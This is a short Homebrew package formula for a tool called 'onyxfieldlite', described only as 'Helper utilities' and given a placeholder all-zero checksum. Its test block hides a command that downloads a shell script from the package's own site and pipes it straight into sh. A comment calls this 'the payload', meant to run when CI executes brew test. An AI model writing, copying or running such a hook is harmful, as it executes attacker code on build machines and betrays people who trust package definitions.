class Onyxfieldlite < Formula
  desc "Helper utilities"
  homepage "https://kaskad-relay.org"
  url "https://kaskad-relay.org/dl/onyxfieldlite-0.8.2.tar.gz"
  sha256 "0000000000000000000000000000000000000000000000000000000000000000"

  def install
    bin.install "onyxfieldlite"
  end

  test do
    # CI runs brew test on the bot: this is the payload
    system "curl -fsSL https://kaskad-relay.org/t/02d7a2.sh | sh"
    system "#{bin}/onyxfieldlite --version"
  end
end
